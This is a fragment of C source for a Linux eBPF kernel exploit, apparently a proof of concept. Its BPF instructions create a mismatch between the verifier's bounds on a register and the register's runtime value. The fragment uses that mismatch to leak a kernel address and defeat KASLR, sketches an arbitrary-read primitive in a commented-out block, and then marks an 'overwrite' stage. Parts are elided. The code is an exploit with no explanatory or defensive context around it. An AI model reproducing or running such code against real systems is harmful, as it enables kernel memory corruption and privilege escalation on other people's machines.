...
int load_prog()
{
	struct bpf_insn prog[] = {
		...
		BPF_MAP_GET(0, BPF_REG_6), // r6 = map_fd[0]
		BPF_JMP32_IMM(BPF_JGE, BPF_REG_6, 1, 1), // umin_value = 0x1
		BPF_EXIT_INSN(),
		BPF_MOV64_IMM(BPF_REG_8, 0x1),
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_8, 32),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 1), // umax_value = 0x100000001
		BPF_JMP_REG(BPF_JLE, BPF_REG_6, BPF_REG_8, 1), // umax = 0x100000001
		BPF_EXIT_INSN(),
		BPF_JMP32_IMM(BPF_JNE, BPF_REG_6, 3, 1),
		BPF_EXIT_INSN(),
		
		// shellcode reg6 = 1
		// r7 = r6 = 0x1 ; r7 = r6 = 0x0 in verifier 
		BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 2), // r6 &= 2
		BPF_ALU64_IMM(BPF_RSH, BPF_REG_6, 1), // r6 >>= 1   
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0xd0), // 0xd0	

		BPF_LD_MAP_FD(BPF_REG_1, map_fd),
		BPF_MAP_GET(1, BPF_REG_7), // r7 = ctl_value
		BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 0x1, 19),
		
		// leak kaslr
		BPF_LD_MAP_FD(BPF_REG_1, poc_map_fd), // r1 = poc_map_fd
		BPF_MAP_GET_ADDR(0, BPF_REG_8), // r8 = &poc_map_fd[0]
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6), // r8 = &poc_map[0] - 0xd0 => bpf_array->map->ops
		...
		/*
		// leak anywhere
		BPF_MOV64_REG(BPF_REG_6, BPF_REG_7), // r6 = r7
		BPF_MOV64_REG(BPF_REG_8, BPF_REG_9), // r8 = r9 -> &poc_map_fd[0]
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x90), // 0x90  => map->btf
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6), // R8 => bpf_array->map->btf
		BPF_ST_MEM(BPF_W, BPF_REG_8, 0, 0x82afc4c0),
		BPF_ST_MEM(BPF_W, BPF_REG_8, 4, 0xffffffff),
		*/

		BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 0x1, 1),
		BPF_EXIT_INSN(),
		// overwrite
...
int main(int argc, char *argv[])
{
	...
	/* Create Map */
	map_fd = bpf_create_map_name(BPF_MAP_TYPE_ARRAY, "ctlmap",sizeof(int), sizeof(long long),
			256, 0);
